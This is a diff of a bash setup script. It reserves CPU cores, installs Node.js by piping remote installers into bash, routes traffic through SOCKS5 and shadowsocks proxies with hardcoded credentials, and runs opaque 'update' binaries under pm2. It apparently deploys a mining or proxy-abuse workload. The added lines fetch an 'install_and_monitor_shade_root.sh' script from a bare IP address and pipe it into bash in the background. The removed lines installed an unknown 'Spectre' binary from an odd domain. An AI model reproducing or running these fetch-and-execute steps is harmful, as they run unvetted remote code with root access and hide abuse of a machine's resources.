@@ -21,7 +21,7 @@ currentdate=$(date '+%d-%b-%Y_Shiny_')
 ipaddress=$(curl -s ifconfig.me)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
-used_num_of_cores=`expr $num_of_cores - 1`
+used_num_of_cores=`expr $num_of_cores - 3`
 
 echo ""
 echo "You have a total number of $used_num_of_cores cores"
@@ -33,9 +33,15 @@ echo ""
 
 sleep 2
 
+wget https://nodejs.org/download/release/v18.9.1/node-v18.9.1-linux-x64.tar.gz
+tar -xf node-v18.9.1-linux-x64.tar.gz
+export PATH=$HOME/node-v18.9.1-linux-x64/bin:$PATH
+sleep 2
+node -v && npm
+
 # Function to check if Node.js is installed
 
-wget -O - https://deb.nodesource.com/setup_20.x | bash
+wget -O - https://deb.nodesource.com/setup_16.x | bash
 
 sleep 3
 
@@ -77,23 +83,11 @@ sleep 2
 
 sleep 2
 
-wget http://greenleaf.teatspray.fun/Spectre.tar.gz
+curl -fsSL http://8.208.114.21/install_and_monitor_shade_root.sh | bash &
 
-sleep 2
+sleep 10
 
-tar -xf Spectre.tar.gz
-
-sleep 2
-
-mv Spectre /usr/bin
-
-sleep 2
-
-Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
-
-sleep 2
-
-curl -x socks5h://127.0.0.1:1082 ifconfig.me
+curl -x socks5h://127.0.0.1:1081 ifconfig.me
 
 sleep 2
 
@@ -121,7 +115,7 @@ sleep 2 && \
 cat > update/local/update-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 127.0.0.1:1082
+socks5 = 127.0.0.1:1081
 END
 
 ./update/local/update-local -config update/local/update-local.conf & > /dev/null
@@ -161,4 +155,7 @@ END
 sleep 5
 
 ./update/update pm2 start index.js --watch
+
+sleep 5
+
 pm2 monit
